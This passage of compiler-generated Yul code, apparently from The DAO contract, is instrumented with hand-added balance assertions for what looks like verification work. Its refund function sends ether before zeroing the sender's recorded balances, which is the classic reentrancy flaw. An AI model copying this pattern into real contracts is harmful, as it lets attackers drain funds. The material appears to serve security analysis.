                            abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))

                            abi_encode_t_uint256_to_t_uint256_fromStack(value1,  add(headStart, 32))

                        }

                        function store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470(memPtr) {

                        }

                        function abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos) -> end {
                            pos := array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, 0)
                            store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470(pos)
                            end := add(pos, 0)
                        }

                        function abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack(pos ) -> end {

                            pos := abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack( pos)

                            end := pos
                        }

                        /// @ast-id 651
                        /// @src 0:12071:12776  "function refund() public override {..."
                        function fun_refund_651() {

                            /// @src 0:12119:12134  "block.timestamp"
                            let expr_574 := timestamp()
                            /// @src 0:12137:12148  "closingTime"
                            let _208 := read_from_storage_split_offset_0_t_uint256(0x00)
                            let expr_575 := _208
                            /// @src 0:12119:12148  "block.timestamp > closingTime"
                            let expr_576 := gt(cleanup_t_uint256(expr_574), cleanup_t_uint256(expr_575))
                            /// @src 0:12119:12161  "block.timestamp > closingTime && !isFueled"
                            let expr_579 := expr_576
                            if expr_579 {
                                /// @src 0:12153:12161  "isFueled"
                                let _209 := read_from_storage_split_offset_0_t_bool(0x02)
                                let expr_577 := _209
                                /// @src 0:12152:12161  "!isFueled"
                                let expr_578 := cleanup_t_bool(iszero(expr_577))
                                /// @src 0:12119:12161  "block.timestamp > closingTime && !isFueled"
                                expr_579 := expr_578
                            }
                            /// @src 0:12115:12770  "if (block.timestamp > closingTime && !isFueled) {..."
                            if expr_579 {
                                /// @src 0:12272:12284  "extraBalance"
                                let _210_address := read_from_storage_split_offset_0_t_contract$_ManagedAccount_$375(0x03)
                                let expr_582_address := _210_address
                                /// @src 0:12264:12285  "address(extraBalance)"
                                let expr_583 := convert_t_contract$_ManagedAccount_$375_to_t_address(expr_582_address)
                                /// @src 0:12264:12293  "address(extraBalance).balance"
                                let expr_584 := balance(expr_583)
                                /// @src 0:12297:12309  "extraBalance"
                                let _211_address := read_from_storage_split_offset_0_t_contract$_ManagedAccount_$375(0x03)
                                let expr_585_address := _211_address
                                /// @src 0:12297:12326  "extraBalance.accumulatedInput"
                                let expr_586_address := convert_t_contract$_ManagedAccount_$375_to_t_address(expr_585_address)
                                let expr_586_functionSelector := 0xd2cc718f
                                /// @src 0:12297:12328  "extraBalance.accumulatedInput()"

                                // storage for arguments and returned data
                                let _212 := allocate_unbounded()
                                mstore(_212, shift_left_224(expr_586_functionSelector))
                                let _213 := abi_encode_tuple__to__fromStack(add(_212, 4) )

                                let _214 := staticcall(gas(), expr_586_address,  _212, sub(_213, _212), _212, 32)

                                if iszero(_214) { revert_forward_1() }

                                let expr_587
                                if _214 {

                                    let _215 := 32

                                    if gt(_215, returndatasize()) {
                                        _215 := returndatasize()
                                    }

                                    // update freeMemoryPointer according to dynamic return size
                                    finalize_allocation(_212, _215)

                                    // decode return parameters from external try-call into retVars
                                    expr_587 :=  abi_decode_tuple_t_uint256_fromMemory(_212, add(_212, _215))
                                }
                                /// @src 0:12264:12328  "address(extraBalance).balance >= extraBalance.accumulatedInput()"
                                let expr_588 := iszero(lt(cleanup_t_uint256(expr_584), cleanup_t_uint256(expr_587)))
                                /// @src 0:12260:12413  "if (address(extraBalance).balance >= extraBalance.accumulatedInput())..."
                                if expr_588 {
                                    /// @src 0:12346:12358  "extraBalance"
                                    let _216_address := read_from_storage_split_offset_0_t_contract$_ManagedAccount_$375(0x03)
                                    let expr_589_address := _216_address
                                    /// @src 0:12346:12365  "extraBalance.payOut"
                                    let expr_591_address := convert_t_contract$_ManagedAccount_$375_to_t_address(expr_589_address)
                                    let expr_591_functionSelector := 0x0221038a
                                    /// @src 0:12374:12378  "this"
                                    let expr_594_address := address()
                                    /// @src 0:12366:12379  "address(this)"
                                    let expr_595 := convert_t_contract$_TokenCreation_$695_to_t_address(expr_594_address)
                                    /// @src 0:12381:12393  "extraBalance"
                                    let _217_address := read_from_storage_split_offset_0_t_contract$_ManagedAccount_$375(0x03)
                                    let expr_596_address := _217_address
                                    /// @src 0:12381:12410  "extraBalance.accumulatedInput"
                                    let expr_597_address := convert_t_contract$_ManagedAccount_$375_to_t_address(expr_596_address)
                                    let expr_597_functionSelector := 0xd2cc718f
                                    /// @src 0:12381:12412  "extraBalance.accumulatedInput()"

                                    // storage for arguments and returned data
                                    let _218 := allocate_unbounded()
                                    mstore(_218, shift_left_224(expr_597_functionSelector))
                                    let _219 := abi_encode_tuple__to__fromStack(add(_218, 4) )

                                    let _220 := staticcall(gas(), expr_597_address,  _218, sub(_219, _218), _218, 32)

                                    if iszero(_220) { revert_forward_1() }

                                    let expr_598
                                    if _220 {

                                        let _221 := 32

                                        if gt(_221, returndatasize()) {
                                            _221 := returndatasize()
                                        }

                                        // update freeMemoryPointer according to dynamic return size
                                        finalize_allocation(_218, _221)

                                        // decode return parameters from external try-call into retVars
                                        expr_598 :=  abi_decode_tuple_t_uint256_fromMemory(_218, add(_218, _221))
                                    }
                                    /// @src 0:12346:12413  "extraBalance.payOut(address(this), extraBalance.accumulatedInput())"

                                    // storage for arguments and returned data
                                    let _222 := allocate_unbounded()
                                    mstore(_222, shift_left_224(expr_591_functionSelector))
                                    let _223 := abi_encode_tuple_t_address_t_uint256__to_t_address_t_uint256__fromStack(add(_222, 4) , expr_595, expr_598)

                                    let pbal := balance(address())
                                    let _224 := call(gas(), expr_591_address,  0,  _222, sub(_223, _222), _222, 32)
                                    if lt(balance(address()),pbal) {
                                        ASSERT(eq(sub(pbal,0) , balance(address()))) // THIS FAILS
                                    }

                                    if iszero(_224) { revert_forward_1() }

                                    let expr_599
                                    if _224 {

                                        let _225 := 32

                                        if gt(_225, returndatasize()) {
                                            _225 := returndatasize()
                                        }

                                        // update freeMemoryPointer according to dynamic return size
                                        finalize_allocation(_222, _225)

                                        // decode return parameters from external try-call into retVars
                                        expr_599 :=  abi_decode_tuple_t_bool_fromMemory(_222, add(_222, _225))
                                    }
                                    /// @src 0:12260:12413  "if (address(extraBalance).balance >= extraBalance.accumulatedInput())..."
                                }
                                /// @src 0:12470:12480  "msg.sender"
                                let expr_605 := caller()
                                /// @src 0:12470:12485  "msg.sender.call"
                                let expr_606_address := expr_605
                                /// @src 0:12493:12501  "weiGiven"
                                let _226_slot := 0x04
                                let expr_607_slot := _226_slot
                                /// @src 0:12502:12512  "msg.sender"
                                let expr_609 := caller()
                                /// @src 0:12493:12513  "weiGiven[msg.sender]"
                                let _227 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_607_slot,expr_609)
                                let _228 := read_from_storage_split_offset_0_t_uint256(_227)
                                let expr_610 := _228
                                /// @src 0:12470:12514  "msg.sender.call{value: weiGiven[msg.sender]}"
                                let expr_611_address := expr_606_address
                                let expr_611_value := expr_610
                                /// @src 0:12470:12518  "msg.sender.call{value: weiGiven[msg.sender]}(\"\")"

                                let _229 := allocate_unbounded()
                                let _230 := sub(abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack(_229  ), _229)

                                let pbal := balance(address())
                         
                                let expr_613_component_1 := call(gas(), expr_611_address,  expr_611_value,  _229, _230, 0, 0)
                                if lt(balance(address()),pbal) {
                                    ASSERT(eq(sub(pbal,expr_611_value) , balance(address())))
                                }
                                
                                let expr_613_component_2_mpos := extract_returndata()
                                /// @src 0:12451:12518  "(bool success, ) = msg.sender.call{value: weiGiven[msg.sender]}(\"\")"
                                let var_success_603 := expr_613_component_1
                                /// @src 0:12536:12543  "success"
                                let _231 := var_success_603
                                let expr_615 := _231
                                /// @src 0:12532:12760  "if (success) {..."
                                if expr_615 {
                                    /// @src 0:12575:12585  "msg.sender"
                                    let expr_618 := caller()
                                    /// @src 0:12587:12595  "weiGiven"
                                    let _232_slot := 0x04
                                    let expr_619_slot := _232_slot
                                    /// @src 0:12596:12606  "msg.sender"
                                    let expr_621 := caller()
                                    /// @src 0:12587:12607  "weiGiven[msg.sender]"
                                    let _233 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_619_slot,expr_621)
                                    let _234 := read_from_storage_split_offset_0_t_uint256(_233)
                                    let expr_622 := _234
                                    /// @src 0:12568:12608  "Refund(msg.sender, weiGiven[msg.sender])"
                                    let _235 := 0xbb28353e4598c3b9199101a66e0989549b659a59a54d2c27fbb183f1932c8e6d
                                    let _236 := convert_t_address_to_t_address(expr_618)
                                    {
                                        let _237 := allocate_unbounded()
                                        let _238 := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(_237 , expr_622)
                                        log2(_237, sub(_238, _237) , _235, _236)
                                    }/// @src 0:12641:12649  "balances"
                                    let _239_slot := 0x05
                                    let expr_626_slot := _239_slot
                                    /// @src 0:12650:12660  "msg.sender"
                                    let expr_628 := caller()
                                    /// @src 0:12641:12661  "balances[msg.sender]"
                                    let _240 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_626_slot,expr_628)
                                    let _241 := read_from_storage_split_offset_0_t_uint256(_240)
                                    let expr_629 := _241
                                    /// @src 0:12626:12661  "totalSupply -= balances[msg.sender]"
                                    let _242 := read_from_storage_split_offset_0_t_uint256(0x07)
                                    let expr_630 := checked_sub_t_uint256(_242, expr_629)

                                    update_storage_value_offset_0_t_uint256_to_t_uint256(0x07, expr_630)
                                    /// @src 0:12702:12703  "0"
                                    let expr_636 := 0x00
                                    /// @src 0:12679:12703  "balances[msg.sender] = 0"
                                    let _243 := convert_t_rational_0_by_1_to_t_uint256(expr_636)
                                    /// @src 0:12679:12687  "balances"
                                    let _244_slot := 0x05
                                    let expr_632_slot := _244_slot
                                    /// @src 0:12688:12698  "msg.sender"
                                    let expr_634 := caller()
                                    /// @src 0:12679:12699  "balances[msg.sender]"
                                    let _245 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_632_slot,expr_634)
                                    /// @src 0:12679:12703  "balances[msg.sender] = 0"
                                    update_storage_value_offset_0_t_uint256_to_t_uint256(_245, _243)
                                    let expr_637 := _243
                                    /// @src 0:12744:12745  "0"
                                    let expr_643 := 0x00
                                    /// @src 0:12721:12745  "weiGiven[msg.sender] = 0"
                                    let _246 := convert_t_rational_0_by_1_to_t_uint256(expr_643)
                                    /// @src 0:12721:12729  "weiGiven"
                                    let _247_slot := 0x04
                                    let expr_639_slot := _247_slot
                                    /// @src 0:12730:12740  "msg.sender"
                                    let expr_641 := caller()
                                    /// @src 0:12721:12741  "weiGiven[msg.sender]"
                                    let _248 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_639_slot,expr_641)
                                    /// @src 0:12721:12745  "weiGiven[msg.sender] = 0"
                                    update_storage_value_offset_0_t_uint256_to_t_uint256(_248, _246)
                                    let expr_644 := _246
                                    /// @src 0:12532:12760  "if (success) {..."
                                }
                                /// @src 0:12115:12770  "if (block.timestamp > closingTime && !isFueled) {..."
                            }

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 1057
                        /// @src 0:29561:29665  "modifier onlyTokenholders override {..."
                        function modifier_onlyTokenholders_1234(var__proposalID_1237, var__recipient_1221, var__amount_1223, var__description_1225_mpos, var__transactionData_1227_mpos, var__debatingPeriod_1229, var__newCurator_1231) -> _250 {
                            _250 := var__proposalID_1237
                            /// @src 0:29625:29635  "msg.sender"
                            let expr_1047 := caller()
                            /// @src 0:29615:29636  "balanceOf(msg.sender)"
                            let expr_1048 := fun_balanceOf_109(expr_1047)
                            /// @src 0:29640:29641  "0"
                            let expr_1049 := 0x00
                            /// @src 0:29615:29641  "balanceOf(msg.sender) == 0"
                            let expr_1050 := eq(cleanup_t_uint256(expr_1048), convert_t_rational_0_by_1_to_t_uint256(expr_1049))
                            /// @src 0:29614:29642  "(balanceOf(msg.sender) == 0)"
                            let expr_1051 := expr_1050
                            /// @src 0:29613:29642  "!(balanceOf(msg.sender) == 0)"
                            let expr_1052 := cleanup_t_bool(iszero(expr_1051))
                            /// @src 0:29606:29643  "assert(!(balanceOf(msg.sender) == 0))"
                            assert_helper(expr_1052)
                            /// @src 0:29657:29658  "_"
                            _250 := fun_newProposal_1450_inner(var__proposalID_1237, var__recipient_1221, var__amount_1223, var__description_1225_mpos, var__transactionData_1227_mpos, var__debatingPeriod_1229, var__newCurator_1231)

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function cleanup_t_rational_604800_by_1(value) -> cleaned {
                            cleaned := value
                        }

                        function convert_t_rational_604800_by_1_to_t_uint256(value) -> converted {
                            converted := cleanup_t_uint256(identity(cleanup_t_rational_604800_by_1(value)))
                        }

                        /// @src 0:14669:14713  "uint constant minSplitDebatePeriod = 1 weeks"
                        function constant_minSplitDebatePeriod_706() -> ret {
                            /// @src 0:14706:14713  "1 weeks"
                            let expr_705 := 0x093a80
                            let _258 := convert_t_rational_604800_by_1_to_t_uint256(expr_705)

                            ret := _258
                        }

                        /// @src 0:14552:14599  "uint constant minProposalDebatePeriod = 2 weeks"
                        function constant_minProposalDebatePeriod_703() -> ret {
                            /// @src 0:14592:14599  "2 weeks"
                            let expr_702 := 0x127500
                            let _262 := convert_t_rational_1209600_by_1_to_t_uint256(expr_702)

                            ret := _262
                        }

                        function cleanup_t_rational_4838400_by_1(value) -> cleaned {
                            cleaned := value
                        }

                        function convert_t_rational_4838400_by_1_to_t_uint256(value) -> converted {
                            converted := cleanup_t_uint256(identity(cleanup_t_rational_4838400_by_1(value)))
                        }

                        function convert_array_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_to_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_ptr(value) -> converted  {
                            converted := value

                        }

                        function array_length_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_ptr(value) -> length {

                            length := sload(value)

                        }

                        function array_dataslot_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_ptr(ptr) -> data {
                            data := ptr
                            mstore(0, ptr)
                            data := keccak256(0, 0x20)

                        }

                        function storage_array_index_access_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_ptr(array, index) -> slot, offset {
                            
                            let arrayLength := array_length_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_ptr(array)
                            if iszero(lt(index, arrayLength)) { panic_error_0x32() }

                            let dataArea := array_dataslot_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_ptr(array)
                            slot := add(dataArea, mul(index, 14))
                            offset := 0

                        }

                        function array_push_zero_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_ptr(array) -> slot, offset {

                            let oldLen := array_length_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_ptr(array)
                            if iszero(lt(oldLen, 18446744073709551616)) { panic_error_0x41() }
                            sstore(array, add(oldLen, 1))

                            slot, offset := storage_array_index_access_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_ptr(array, oldLen)
                        }
                        function update_byte_slice_20_shift_0(value, toInsert) -> result {
                            let mask := 0xffffffffffffffffffffffffffffffffffffffff
                            toInsert := shift_left_0(toInsert)
                            value := and(value, not(mask))
                            result := or(value, and(toInsert, mask))
                        }

                        function prepare_store_t_address(value) -> ret {
                            ret := value
                        }

                        function update_storage_value_offset_0_t_address_to_t_address(slot, value_0) {
                            let convertedValue_0 := convert_t_address_to_t_address(value_0)
                            sstore(slot, update_byte_slice_20_shift_0(sload(slot), prepare_store_t_address(convertedValue_0)))
                        }

                        function panic_error_0x00() {
                            mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)
                            mstore(4, 0x00)
                            revert(0, 0x24)
                        }

                        function divide_by_32_ceil(value) -> result {
                            result := div(add(value, 31), 32)
                        }

                        function shift_left_dynamic(bits, value) -> newValue {
                            newValue :=

                            shl(bits, value)

                        }

                        function update_byte_slice_dynamic32(value, shiftBytes, toInsert) -> result {
                            let shiftBits := mul(shiftBytes, 8)
                            let mask := shift_left_dynamic(shiftBits, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
                            toInsert := shift_left_dynamic(shiftBits, toInsert)
                            value := and(value, not(mask))
                            result := or(value, and(toInsert, mask))
                        }

                        function update_storage_value_t_uint256_to_t_uint256(slot, offset, value_0) {
                            let convertedValue_0 := convert_t_uint256_to_t_uint256(value_0)
                            sstore(slot, update_byte_slice_dynamic32(sload(slot), offset, prepare_store_t_uint256(convertedValue_0)))
                        }

                        function storage_set_to_zero_t_uint256(slot, offset) {
                            let zero_0 := zero_value_for_split_t_uint256()
                            update_storage_value_t_uint256_to_t_uint256(slot, offset, zero_0)
                        }

                        function clear_storage_range_t_bytes1(start, end) {
                            for {} lt(start, end) { start := add(start, 1) }
                            {
                                storage_set_to_zero_t_uint256(start, 0)
                            }
                        }

                        function clean_up_bytearray_end_slots_t_string_storage(array, len, startIndex) {

                            if gt(len, 31) {
                                let dataArea := array_dataslot_t_string_storage(array)
                                let deleteStart := add(dataArea, divide_by_32_ceil(startIndex))
                                // If we are clearing array to be short byte array, we want to clear only data starting from array data area.
                                if lt(startIndex, 32) { deleteStart := dataArea }
                                clear_storage_range_t_bytes1(deleteStart, add(dataArea, divide_by_32_ceil(len)))
                            }

                        }

                        function mask_bytes_dynamic(data, bytes) -> result {
                            let mask := not(shift_right_unsigned_dynamic(mul(8, bytes), not(0)))
                            result := and(data, mask)
                        }
                        function extract_used_part_and_set_length_of_short_byte_array(data, len) -> used {
                            // we want to save only elements that are part of the array after resizing
                            // others should be set to zero
                            data := mask_bytes_dynamic(data, len)
                            used := or(data, mul(2, len))
                        }
                        function copy_byte_array_to_storage_from_t_string_memory_ptr_to_t_string_storage(slot, src) {

                            let newLen := array_length_t_string_memory_ptr(src)
                            // Make sure array length is sane
                            if gt(newLen, 0xffffffffffffffff) { panic_error_0x41() }

                            let oldLen := extract_byte_array_length(sload(slot))

                            // potentially truncate data
                            clean_up_bytearray_end_slots_t_string_storage(slot, oldLen, newLen)

                            let srcOffset := 0

                            srcOffset := 0x20

                            switch gt(newLen, 31)
                            case 1 {
                                let loopEnd := and(newLen, not(0x1f))

                                let dstPtr := array_dataslot_t_string_storage(slot)
                                let i := 0
                                for { } lt(i, loopEnd) { i := add(i, 0x20) } {
                                    sstore(dstPtr, mload(add(src, srcOffset)))
                                    dstPtr := add(dstPtr, 1)
                                    srcOffset := add(srcOffset, 32)
                                }
                                if lt(loopEnd, newLen) {
                                    let lastValue := mload(add(src, srcOffset))
                                    sstore(dstPtr, mask_bytes_dynamic(lastValue, and(newLen, 0x1f)))
                                }
                                sstore(slot, add(mul(newLen, 2), 1))
                            }
                            default {
                                let value := 0
                                if newLen {
                                    value := mload(add(src, srcOffset))
                                }
                                sstore(slot, extract_used_part_and_set_length_of_short_byte_array(value, newLen))
                            }
                        }

                        function update_storage_value_offset_0_t_string_memory_ptr_to_t_string_storage(slot, value_0) {

                            copy_byte_array_to_storage_from_t_string_memory_ptr_to_t_string_storage(slot, value_0)
                        }

                        function convert_t_bytes32_to_t_bytes32(value) -> converted {
                            converted := cleanup_t_bytes32(value)
                        }

                        function prepare_store_t_bytes32(value) -> ret {
                            ret := shift_right_0_unsigned(value)
                        }

                        function update_storage_value_offset_0_t_bytes32_to_t_bytes32(slot, value_0) {
                            let convertedValue_0 := convert_t_bytes32_to_t_bytes32(value_0)
                            sstore(slot, update_byte_slice_32_shift_0(sload(slot), prepare_store_t_bytes32(convertedValue_0)))
                        }

                        function update_byte_slice_1_shift_0(value, toInsert) -> result {
                            let mask := 255
                            toInsert := shift_left_0(toInsert)
                            value := and(value, not(mask))
                            result := or(value, and(toInsert, mask))
                        }

                        function update_storage_value_offset_0_t_bool_to_t_bool(slot, value_0) {
                            let convertedValue_0 := convert_t_bool_to_t_bool(value_0)
                            sstore(slot, update_byte_slice_1_shift_0(sload(slot), prepare_store_t_bool(convertedValue_0)))
                        }

                        function convert_array_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage_to_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage_ptr(value) -> converted  {
                            converted := value

                        }

                        function array_length_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage_ptr(value) -> length {

                            length := sload(value)

                        }

                        function array_dataslot_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage_ptr(ptr) -> data {
                            data := ptr

                            mstore(0, ptr)
                            data := keccak256(0, 0x20)

                        }

                        function storage_array_index_access_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage_ptr(array, index) -> slot, offset {
                            let arrayLength := array_length_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage_ptr(array)
                            if iszero(lt(index, arrayLength)) { panic_error_0x32() }

                            let dataArea := array_dataslot_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage_ptr(array)
                            slot := add(dataArea, mul(index, 4))
                            offset := 0

                        }

                        function array_push_zero_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage_ptr(array) -> slot, offset {

                            let oldLen := array_length_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage_ptr(array)
                            if iszero(lt(oldLen, 18446744073709551616)) { panic_error_0x41() }
                            sstore(array, add(oldLen, 1))

                            slot, offset := storage_array_index_access_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage_ptr(array, oldLen)
                        }
                        function convert_t_address_to_t_address_payable(value) -> converted {
                            converted := convert_t_uint160_to_t_address_payable(value)
                        }

                        function convert_t_address_payable_to_t_address_payable(value) -> converted {
                            converted := convert_t_uint160_to_t_address_payable(value)
                        }

                        function prepare_store_t_address_payable(value) -> ret {
                            ret := value
                        }

                        function update_storage_value_offset_0_t_address_payable_to_t_address_payable(slot, value_0) {
                            let convertedValue_0 := convert_t_address_payable_to_t_address_payable(value_0)

                            sstore(slot, update_byte_slice_20_shift_0(sload(slot), prepare_store_t_address_payable(convertedValue_0)))
                        }

                        function abi_encode_tuple_t_address_t_uint256_t_bool_t_string_memory_ptr__to_t_address_t_uint256_t_bool_t_string_memory_ptr__fromStack(headStart , value0, value1, value2, value3) -> tail {
                            tail := add(headStart, 128)

                            abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))

                            abi_encode_t_uint256_to_t_uint256_fromStack(value1,  add(headStart, 32))

                            abi_encode_t_bool_to_t_bool_fromStack(value2,  add(headStart, 64))

                            mstore(add(headStart, 96), sub(tail, headStart))
                            tail := abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack(value3,  tail)

                        }

                        /// @src 0:30999:32948  "function newProposal(..."
                        function fun_newProposal_1450_inner(_251, var__recipient_1221, var__amount_1223, var__description_1225_mpos, var__transactionData_1227_mpos, var__debatingPeriod_1229, var__newCurator_1231) -> var__proposalID_1237 {
                            /// MARK
                            var__proposalID_1237 := _251
                            /// @src 0:31319:31330  "_newCurator"
                            let _252 := var__newCurator_1231
                            let expr_1240 := _252
                            /// @src 0:31319:31525  "_newCurator && (..."
                            let expr_1263 := expr_1240
                            let expr_1242 := 0x00
                            if expr_1263 {
                                /// @src 0:31348:31355  "_amount"
                                let _253 := var__amount_1223
                                let expr_1241 := _253
                                /// @src 0:31359:31360  "0"
                                /// @src 0:31348:31360  "_amount != 0"
                                let expr_1243 := iszero(eq(cleanup_t_uint256(expr_1241), convert_t_rational_0_by_1_to_t_uint256(expr_1242)))
                                /// @src 0:31348:31404  "_amount != 0..."
                                let expr_1248 := expr_1243
                                if iszero(expr_1248) {
                                    /// @src 0:31376:31392  "_transactionData"
                                    let _254_mpos := var__transactionData_1227_mpos
                                    let expr_1244_mpos := _254_mpos
                                    /// @src 0:31376:31399  "_transactionData.length"
                                    let expr_1245 := array_length_t_bytes_memory_ptr(expr_1244_mpos)
                                    /// @src 0:31403:31404  "0"
                                    let expr_1246 := 0x00
                                    /// @src 0:31376:31404  "_transactionData.length != 0"
                                    let expr_1247 := iszero(eq(cleanup_t_uint256(expr_1245), convert_t_rational_0_by_1_to_t_uint256(expr_1246)))
                                    /// @src 0:31348:31404  "_amount != 0..."
                                    expr_1248 := expr_1247
                                }
                                /// @src 0:31348:31441  "_amount != 0..."
                                let expr_1252 := expr_1248
                                if iszero(expr_1252) {
                                    /// @src 0:31420:31430  "_recipient"
                                    let _255 := var__recipient_1221
                                    let expr_1249 := _255
                                    /// @src 0:31434:31441  "curator"
                                    let _256 := read_from_storage_split_offset_0_t_address(0x0b)
                                    let expr_1250 := _256
                                    /// @src 0:31420:31441  "_recipient == curator"
                                    let expr_1251 := eq(cleanup_t_address(expr_1249), cleanup_t_address(expr_1250))
                                    /// @src 0:31348:31441  "_amount != 0..."
                                    expr_1252 := expr_1251
                                }
                                /// @src 0:31348:31470  "_amount != 0..."
                                let expr_1257 := expr_1252
                                if iszero(expr_1257) {
                                    /// @src 0:31457:31466  "msg.value"
                                    let expr_1254 := callvalue()
                                    /// @src 0:31469:31470  "0"
                                    let expr_1255 := 0x00
                                    /// @src 0:31457:31470  "msg.value > 0"
                                    let expr_1256 := gt(cleanup_t_uint256(expr_1254), convert_t_rational_0_by_1_to_t_uint256(expr_1255))
                                    /// @src 0:31348:31470  "_amount != 0..."
                                    expr_1257 := expr_1256
                                }
                                /// @src 0:31348:31524  "_amount != 0..."
                                let expr_1261 := expr_1257
                                if iszero(expr_1261) {
                                    /// @src 0:31486:31501  "_debatingPeriod"
                                    let _257 := var__debatingPeriod_1229
                                    let expr_1258 := _257
                                    /// @src 0:31504:31524  "minSplitDebatePeriod"
                                    let expr_1259 := constant_minSplitDebatePeriod_706()
                                    /// @src 0:31486:31524  "_debatingPeriod < minSplitDebatePeriod"
                                    let expr_1260 := lt(cleanup_t_uint256(expr_1258), cleanup_t_uint256(expr_1259))
                                    /// @src 0:31348:31524  "_amount != 0..."
                                    expr_1261 := expr_1260
                                }
                                /// @src 0:31334:31525  "(..."
                                let expr_1262 := expr_1261
                                /// @src 0:31319:31525  "_newCurator && (..."
                                expr_1263 := expr_1262
                            }
                            /// @src 0:31318:31526  "(_newCurator && (..."
                            let expr_1264 := expr_1263
                            /// @src 0:31317:31526  "!(_newCurator && (..."
                            let expr_1265 := cleanup_t_bool(iszero(expr_1264))
                            /// @src 0:31310:31528  "assert(!(_newCurator && (..."
                            assert_helper(expr_1265)
                            /// @src 0:31578:31589  "_newCurator"
                            let _259 := var__newCurator_1231
                            let expr_1269 := _259
                            /// @src 0:31577:31589  "!_newCurator"
                            let expr_1270 := cleanup_t_bool(iszero(expr_1269))
                            /// @src 0:31577:31686  "!_newCurator..."
                            let expr_1281 := expr_1270
                            if expr_1281 {
                                /// @src 0:31626:31636  "_recipient"
                                let _260 := var__recipient_1221
                                let expr_1272 := _260
                                /// @src 0:31607:31637  "isRecipientAllowed(_recipient)"
                                let expr_1273 := fun_isRecipientAllowed_2819(expr_1272)
                                /// @src 0:31606:31637  "!isRecipientAllowed(_recipient)"
                                let expr_1274 := cleanup_t_bool(iszero(expr_1273))
                                /// @src 0:31606:31685  "!isRecipientAllowed(_recipient) || (_debatingPeriod <  minProposalDebatePeriod)"
                                let expr_1279 := expr_1274
                                if iszero(expr_1279) {
                                    /// @src 0:31642:31657  "_debatingPeriod"
                                    let _261 := var__debatingPeriod_1229
                                    let expr_1275 := _261
                                    /// @src 0:31661:31684  "minProposalDebatePeriod"
                                    let expr_1276 := constant_minProposalDebatePeriod_703()
                                    /// @src 0:31642:31684  "_debatingPeriod <  minProposalDebatePeriod"
                                    let expr_1277 := lt(cleanup_t_uint256(expr_1275), cleanup_t_uint256(expr_1276))
                                    /// @src 0:31641:31685  "(_debatingPeriod <  minProposalDebatePeriod)"
                                    let expr_1278 := expr_1277
                                    /// @src 0:31606:31685  "!isRecipientAllowed(_recipient) || (_debatingPeriod <  minProposalDebatePeriod)"
                                    expr_1279 := expr_1278
                                }
                                /// @src 0:31605:31686  "(!isRecipientAllowed(_recipient) || (_debatingPeriod <  minProposalDebatePeriod))"
                                let expr_1280 := expr_1279
                                /// @src 0:31577:31686  "!_newCurator..."
                                expr_1281 := expr_1280
                            }
                            /// @src 0:31563:31696  "(..."
                            let expr_1282 := expr_1281
                            /// @src 0:31562:31696  "!(..."
                            let expr_1283 := cleanup_t_bool(iszero(expr_1282))
                            /// @src 0:31555:31697  "assert(!(..."
                            assert_helper(expr_1283)
                            /// @src 0:31717:31732  "_debatingPeriod"
                            let _263 := var__debatingPeriod_1229
                            let expr_1287 := _263
                            /// @src 0:31735:31742  "8 weeks"
                            let expr_1288 := 0x49d400
                            /// @src 0:31717:31742  "_debatingPeriod > 8 weeks"
                            let expr_1289 := gt(cleanup_t_uint256(expr_1287), convert_t_rational_4838400_by_1_to_t_uint256(expr_1288))
                            /// @src 0:31716:31743  "(_debatingPeriod > 8 weeks)"
                            let expr_1290 := expr_1289
                            /// @src 0:31715:31743  "!(_debatingPeriod > 8 weeks)"
                            let expr_1291 := cleanup_t_bool(iszero(expr_1290))
                            /// @src 0:31708:31744  "assert(!(_debatingPeriod > 8 weeks))"
                            assert_helper(expr_1291)
                            /// @src 0:31765:31773  "isFueled"
                            let _264 := read_from_storage_split_offset_0_t_bool(0x02)
                            let expr_1295 := _264
